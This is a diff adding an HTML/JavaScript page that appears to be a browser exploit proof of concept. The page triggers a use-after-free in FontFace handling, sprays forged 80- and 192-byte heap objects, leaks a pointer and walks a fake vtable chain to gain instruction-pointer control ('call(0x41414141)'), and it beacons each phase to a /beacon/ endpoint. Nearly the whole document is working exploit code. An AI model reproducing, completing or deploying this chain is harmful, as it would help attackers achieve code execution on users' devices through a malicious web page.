@@ -1,0 +1,464 @@
+<!--
+  p579 v5: Single-Trigger Chain Consumption Test for 14.10
+
+  Each phase requires a SEPARATE COLD BOOT (full power off/on).
+  Second UAF in the same process never reclaims (proven upstream).
+
+  Phase 0 (LEAK) — only if T not known:
+    Trigger UAF → spray 192B → extract T from +0x58 residual.
+    Process usually dies (walk hits unforged garbage). Expected.
+    Inline scan saves T to localStorage before death.
+
+  Phase 1 (CONTROL):
+    Read T → pre-churn → trigger UAF → spray 80B V102 (m_ptr=NULL) + 192B anchor.
+    Expected: SURVIVE. Proves 80B reclaim landed and walk geometry safe.
+
+  Phase 2 (TEST):
+    Read T → pre-churn → trigger UAF → spray 80B V102 (m_ptr=chain+poison) + 192B anchor.
+    Expected: DIE at poison address. Proves chain consumption.
+
+  Verdict: CTRL=survived + TEST=died → CHAIN CONSUMPTION PROVEN on 14.10.
+
+  T is deterministic on 14.10: 0x10001cb0d0 across 10 boots.
+  Open #hardcode to skip LEAK and use hardcoded T.
+  Open #reset to clear ALL state.
+  Open #retry to restart from CONTROL with stored T.
+
+  V102 layout (80B = 16B header + 64B buckets, B = T - 0x10):
+    B+0x00: deletedCount=0, keyCount=1, mask=0, size=1
+    B+0x10: bucket[0] = T+0x30 (impl ptr)
+    B+0x28: bucket[3] = 0x42424242 (alt poison for vtable+0x28)
+    B+0x30: bucket[4] = B (vtable ptr)
+    B+0x40: bucket[6] = 0x41414141 (poison / refCount / vtable+0x40 target)
+    B+0x48: bucket[7] = NULL(ctrl) or T+0x20(test) (m_ptr)
+
+  Walk: face+0x58→T → hdr(kc=1) → bucket[0]→impl(T+0x30) →
+        ref(+0x00) → m_ptr(+0x08=bucket[7]) → client(T+0x20=bucket[4]) →
+        vtable=*(T+0x20)=B → call(B+0x40=bucket[6]=0x41414141) → FAULT
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p579 v5</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+
+function readQ(v,o){
+  var lo=(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);
+  var hi=(v[o+4]|0)+((v[o+5]|0)<<8)+((v[o+6]|0)<<16)+((v[o+7]|0)*0x1000000);
+  return [hi,lo];
+}
+function writeQ(v,o,hi,lo){
+  v[o]=lo&0xFF;v[o+1]=(lo>>>8)&0xFF;v[o+2]=(lo>>>16)&0xFF;v[o+3]=(lo>>>24)&0xFF;
+  v[o+4]=hi&0xFF;v[o+5]=(hi>>>8)&0xFF;v[o+6]=(hi>>>16)&0xFF;v[o+7]=(hi>>>24)&0xFF;
+}
+function writeD(v,o,val){v[o]=val&0xFF;v[o+1]=(val>>>8)&0xFF;v[o+2]=(val>>>16)&0xFF;v[o+3]=(val>>>24)&0xFF;}
+function addQ(hi,lo,d){var nl=lo+d,nh=hi;while(nl<0){nh--;nl+=0x100000000;}while(nl>=0x100000000){nh++;nl-=0x100000000;}return[nh,nl];}
+function hexQ(hi,lo){return('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8);}
+function hex(v){return('0'+v.toString(16)).slice(-2);}
+
+/* ---- State ---- */
+function gs(){try{var s=localStorage.getItem('p579');return s?JSON.parse(s):null;}catch(e){return null;}}
+function ss(o){try{localStorage.setItem('p579',JSON.stringify(o));}catch(e){}}
+
+/* ---- Config ---- */
+var T_HARD=[0x10,0x01CB0D0]; /* 0x10001cb0d0 deterministic on 14.10 */
+var LEAK_K=16;
+var FORGE_80K=32;
+var FORGE_192K=8;
+
+var retained=[];
+var state;
+
+/* ---- Pre-churn (abxanax 100% reclaim recipe) ---- */
+function prechurn(cb){
+  b('P579-PC');
+  var name='pc'+Math.random().toString(36).slice(2,8);
+  var dummy;
+  try{dummy=new FontFace(name,'local(Arial)',{unicodeRange:'U+0043'});}
+  catch(e){b('P579-PC-ERR');cb();return;}
+  document.fonts.add(dummy);
+  dummy.load();
+  dummy.loaded.then(function(){
+    try{document.fonts.delete(dummy);}catch(e){}
+    document.body.offsetHeight;
+    b('P579-PC-OK');
+    cb();
+  },function(){b('P579-PC-FAIL');cb();});
+}
+
+/* ---- Phase 0: LEAK ---- */
+function doLeak(){
+  var fname='fl'+state.boots;
+  var sname='sl'+state.boots;
+  b('P579-LEAK-GO');
+
+  var victim=new FontFace(fname,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(victim);
+  void victim.loaded;
+  retained.push(victim);
+
+  var styleEl=document.createElement('style');
+  styleEl.textContent="@font-face{font-family:"+sname+";src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(styleEl);
+
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired)return undefined;
+      fired=true;
+      if(styleEl)styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      b('P579-LEAK-FREE');
+
+      window.__map=[];
+      for(var k=0;k<LEAK_K;k++){
+        var ab=new ArrayBuffer(192);
+        window.__map.push(new Uint8Array(ab));
+      }
+      b('P579-LEAK-SPRAY-K='+LEAK_K);
+
+      /* Inline scan — save T before the walk kills us */
+      for(var i=0;i<window.__map.length;i++){
+        var v=window.__map[i],n=0;
+        for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+        if(n>0){
+          var p00=readQ(v,0x00);
+          var p58=readQ(v,0x58);
+          b('P579-LEAK-INLINE-i='+i+'-n='+n+'-T='+hexQ(p58[0],p58[1])+'-V='+hexQ(p00[0],p00[1]));
+          if(p58[0]>=0x10||p58[1]!==0){
+            state.T=p58;
+            state.V=p00;
+            state.phase='control';
+            ss(state);
+            b('P579-LEAK-T-SAVED');
+          }
+          break;
+        }
+      }
+
+      try{document.fonts.check('1em '+sname);}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  document.fonts.load('1em '+fname+', '+sname,'AB').then(function(){},function(){});
+
+  /* Deferred scan (backup — fires only if we survive) */
+  var done=false;
+  function scan(){
+    if(done)return;
+    var m=window.__map;if(!m||!m.length)return;
+    for(var i=0;i<m.length;i++){
+      var v=m[i],n=0,first=-1;
+      for(var j=0;j<v.length;j++)if(v[j]!==0){n++;if(first<0)first=j;}
+      if(n>0){
+        done=true;
+        var p58=readQ(v,0x58);
+        var p00=readQ(v,0x00);
+        var dump='';
+        var stop=Math.min(v.length,first+32);
+        for(var j=first;j<stop;j++)dump+=hex(v[j]);
+        b('P579-LEAK-HIT-i='+i+'-o='+first+'-n='+n+'-'+dump);
+        b('P579-LEAK-T='+hexQ(p58[0],p58[1])+'-V='+hexQ(p00[0],p00[1]));
+
+        if((p58[0]>=0x10||p58[1]!==0)&&!state.T){
+          state.T=p58;
+          state.V=p00;
+          state.phase='control';
+          ss(state);
+          b('P579-LEAK-DEFERRED-SAVED');
+        }
+        return;
+      }
+    }
+  }
+  setTimeout(scan,60);
+  setTimeout(scan,400);
+  setTimeout(scan,1000);
+
+  /* Survival message (only shows if process survives the walk) */
+  setTimeout(function(){
+    if(state.T){
+      state.run=null;
+      ss(state);
+      b('P579-LEAK-SURVIVED-T='+hexQ(state.T[0],state.T[1]));
+      document.body.innerHTML='<p>LEAK OK. T='+hexQ(state.T[0],state.T[1])+
+        ' V='+hexQ(state.V[0],state.V[1])+
+        '<br>COLD BOOT REQUIRED. Load this page after power off/on.</p>';
+    }else{
+      b('P579-NOLEAK-SURVIVED');
+      document.body.innerHTML='<p>NOLEAK — spray missed. Cold boot to retry.</p>';
+    }
+  },2000);
+}
+
+/* ---- Phase 1/2: FORGE ---- */
+function doForge(mode){
+  var T=state.T;
+  var fname='ff'+state.boots;
+  var sname='sf'+state.boots;
+  b('P579-FORGE-'+mode+'-T='+hexQ(T[0],T[1]));
+
+  var Tp30=addQ(T[0],T[1],0x30);
+  var Tm10=addQ(T[0],T[1],-0x10);
+  var Tp20=addQ(T[0],T[1],0x20);
+
+  var victim=new FontFace(fname,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(victim);
+  void victim.loaded;
+  retained.push(victim);
+
+  var styleEl=document.createElement('style');
+  styleEl.textContent="@font-face{font-family:"+sname+";src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(styleEl);
+
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired)return undefined;
+      fired=true;
+      if(styleEl)styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      b('P579-FORGE-FREE');
+
+      /* 80B V102 spray */
+      window.__fg80=[];
+      for(var k=0;k<FORGE_80K;k++){
+        var ab=new ArrayBuffer(80);
+        var v=new Uint8Array(ab);
+
+        /* Header (B+0x00..B+0x0F) */
+        writeD(v,0x00,0);   /* deletedCount */
+        writeD(v,0x04,1);   /* keyCount */
+        writeD(v,0x08,0);   /* mask */
+        writeD(v,0x0C,1);   /* size */
+
+        /* bucket[0] → impl at T+0x30 */
+        writeQ(v,0x10,Tp30[0],Tp30[1]);
+
+        /* bucket[3] = alt poison (vtable+0x28 target) */
+        writeD(v,0x28,0x42424242);
+
+        /* bucket[4] = vtable → B (T-0x10) */
+        writeQ(v,0x30,Tm10[0],Tm10[1]);
+
+        /* bucket[6] = poison / refCount / vtable+0x40 target */
+        writeD(v,0x40,0x41414141);
+
+        /* bucket[7] = m_ptr */
+        if(mode==='control'){
+          writeQ(v,0x48,0,0);
+        }else{
+          writeQ(v,0x48,Tp20[0],Tp20[1]);
+        }
+
+        window.__fg80.push(v);
+      }
+      b('P579-80B-K='+FORGE_80K);
+
+      /* 192B anchor: +0x00=refcount, +0x58=T, +0x68=0 */
+      window.__fg192=[];
+      for(var k=0;k<FORGE_192K;k++){
+        var ab2=new ArrayBuffer(192);
+        var v2=new Uint8Array(ab2);
+        writeD(v2,0x00,2);               /* refcount = 2 (natural) */
+        writeQ(v2,0x58,T[0],T[1]);       /* m_clients → T */
+        /* +0x68 = 0 (null wrapper → safe teardown) */
+        window.__fg192.push(v2);
+      }
+      b('P579-192B-K='+FORGE_192K);
+
+      try{document.fonts.check('1em '+sname);}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  b('P579-FORGE-GO');
+  document.fonts.load('1em '+fname+', '+sname,'AB').then(function(){},function(){});
+
+  /* Readback diagnostic */
+  setTimeout(function(){
+    var fg=window.__fg80;
+    if(!fg||!fg.length)return;
+    var witness='none';
+    var r=readQ(fg[0],0x10);
+    var expect=addQ(T[0],T[1],0x30);
+    if(r[0]===expect[0]&&r[1]===expect[1])witness='OURS';
+    else if(r[0]===0&&r[1]===0)witness='ZERO';
+    else witness='FOREIGN-'+hexQ(r[0],r[1]);
+
+    var fg2=window.__fg192,w58='none';
+    if(fg2&&fg2.length>0){
+      var r58=readQ(fg2[0],0x58);
+      if(r58[0]===T[0]&&r58[1]===T[1])w58='OURS';
+      else if(r58[0]===0&&r58[1]===0)w58='ZERO';
+      else w58='ENGINE-'+hexQ(r58[0],r58[1]);
+    }
+    b('P579-RB-'+mode+'-80w='+witness+'-192p58='+w58);
+  },200);
+
+  /* Survival check */
+  setTimeout(function(){
+    b('P579-SURVIVED-'+mode);
+    state.run=null;
+    if(mode==='control'){
+      state.ctrl='survived';
+      state.phase='test';
+      ss(state);
+      b('P579-CTRL-OK');
+      document.body.innerHTML='<p>CONTROL SURVIVED<br>'+
+        'T='+hexQ(T[0],T[1])+
+        '<br>COLD BOOT REQUIRED. Load this page after power off/on for TEST.</p>';
+    }else{
+      state.test='survived';
+      state.phase='done';
+      ss(state);
+      b('P579-RESULT-CTRL='+state.ctrl+'-TEST=survived');
+      document.body.innerHTML='<p>CTRL='+state.ctrl+' TEST=survived<br>'+
+        'Spray missed or geometry error. T='+hexQ(T[0],T[1])+
+        '<br>Open #retry to restart CONTROL+TEST.</p>';
+    }
+  },1500);
+}
+
+/* ---- Main ---- */
+function main(){
+  if(location.hash==='#reset'){
+    try{localStorage.removeItem('p579');}catch(e){}
+    b('P579-RESET');
+    document.body.innerHTML='<p>State cleared. Remove #reset and cold boot.</p>';
+    return;
+  }
+  if(location.hash==='#hardcode'){
+    var s=gs()||{};
+    s.T=T_HARD;s.V=null;s.phase='control';s.ctrl=null;s.test=null;s.run=null;s.boots=s.boots||0;
+    ss(s);
+    b('P579-HARDCODE-T='+hexQ(T_HARD[0],T_HARD[1]));
+    document.body.innerHTML='<p>Hardcoded T='+hexQ(T_HARD[0],T_HARD[1])+
+      '<br>Remove #hardcode and cold boot for CONTROL.</p>';
+    return;
+  }
+  if(location.hash==='#retry'){
+    var r=gs();
+    if(r){r.phase='control';r.ctrl=null;r.test=null;r.run=null;ss(r);}
+    b('P579-RETRY');
+    document.body.innerHTML='<p>Retrying from CONTROL. Remove #retry and cold boot.</p>';
+    return;
+  }
+
+  state=gs()||{phase:'leak',T:null,V:null,ctrl:null,test:null,run:null,boots:0};
+  state.boots++;
+
+  /* ---- Death detection ---- */
+  if(state.run!==null){
+    var dead=state.run;
+    state.run=null;
+
+    if(dead==='leak'){
+      b('P579-DEATH-leak');
+      if(state.T){
+        state.phase='control';
+        ss(state);
+        b('P579-LEAK-DEATH-GOT-T='+hexQ(state.T[0],state.T[1]));
+        document.body.innerHTML='<p>LEAK died (expected). T='+hexQ(state.T[0],state.T[1])+
+          '<br>COLD BOOT REQUIRED for CONTROL.</p>';
+      }else{
+        state.phase='leak';
+        ss(state);
+        b('P579-LEAK-DEATH-NO-T');
+        document.body.innerHTML='<p>LEAK died, no T captured. Cold boot to retry.</p>';
+      }
+      return;
+    }
+    if(dead==='control'){
+      state.ctrl='died';state.phase='done';
+      ss(state);
+      b('P579-CTRL-DIED');
+      document.body.innerHTML='<p>CONTROL DIED<br>'+
+        'V102 geometry error or spray missed. T='+hexQ(state.T[0],state.T[1])+
+        '<br>Open #retry to restart.</p>';
+      return;
+    }
+    if(dead==='test'){
+      state.test='died';state.phase='done';
+      ss(state);
+      var v=(state.ctrl==='survived')?'CHAIN-CONSUMED':'INCONCLUSIVE';
+      b('P579-'+v+'-CTRL='+state.ctrl+'-TEST=died');
+      document.body.innerHTML='<p><b>'+v+'</b><br>'+
+        'CTRL='+state.ctrl+' TEST=died<br>'+
+        'T='+hexQ(state.T[0],state.T[1])+'</p>';
+      if(v==='CHAIN-CONSUMED'){
+        document.body.innerHTML+='<p>The engine walked the forged V102 chain:<br>'+
+          'm_clients(+0x58) &rarr; T &rarr; hdr(kc=1) &rarr; bucket[0] &rarr; impl &rarr; '+
+          'm_ptr &rarr; client &rarr; vtable &rarr; call(0x41414141) &rarr; FAULT<br>'+
+          'RIP control confirmed on 14.10.</p>';
+      }
+      return;
+    }
+  }
+
+  ss(state);
+  b('P579-B'+state.boots+'-phase='+state.phase);
+
+  /* ---- Phase: LEAK ---- */
+  if(state.phase==='leak'){
+    state.run='leak';
+    ss(state);
+    doLeak();
+    return;
+  }
+
+  /* ---- Validate T ---- */
+  var T=state.T;
+  if(!T||(T[0]===0&&T[1]===0)){
+    b('P579-NO-T');
+    state.phase='leak';
+    ss(state);
+    document.body.innerHTML='<p>No T stored. Options:<br>'+
+      '- Cold boot to run LEAK phase<br>'+
+      '- Open #hardcode to use T='+hexQ(T_HARD[0],T_HARD[1])+'</p>';
+    return;
+  }
+  b('P579-T='+hexQ(T[0],T[1]));
+
+  /* ---- Phase: CONTROL ---- */
+  if(state.phase==='control'){
+    state.run='control';
+    ss(state);
+    document.body.innerHTML='<p>Running CONTROL (m_ptr=NULL)...</p>';
+    prechurn(function(){doForge('control');});
+    return;
+  }
+
+  /* ---- Phase: TEST ---- */
+  if(state.phase==='test'){
+    state.run='test';
+    ss(state);
+    document.body.innerHTML='<p>Running TEST (m_ptr=chain+poison)...</p>';
+    prechurn(function(){doForge('test');});
+    return;
+  }
+
+  /* ---- Phase: DONE ---- */
+  if(state.phase==='done'){
+    var msg='CTRL='+state.ctrl+' TEST='+state.test;
+    if(state.ctrl==='survived'&&state.test==='died')msg+=' &rarr; CHAIN CONSUMPTION PROVEN';
+    else if(state.ctrl==='survived'&&state.test==='survived')msg+=' &rarr; spray missed or geometry error';
+    else if(state.ctrl==='died')msg+=' &rarr; V102 geometry error';
+    b('P579-DONE-'+state.ctrl+'-'+state.test);
+    document.body.innerHTML='<p>'+msg+'<br>T='+hexQ(state.T[0],state.T[1])+
+      '<br>#reset to clear, #retry to restart CONTROL+TEST.</p>';
+  }
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(main,0);
+else document.addEventListener('DOMContentLoaded',main);
+</script></head><body>
+<p>p579 v5 &mdash; single-trigger chain consumption test</p>
+</body></html>
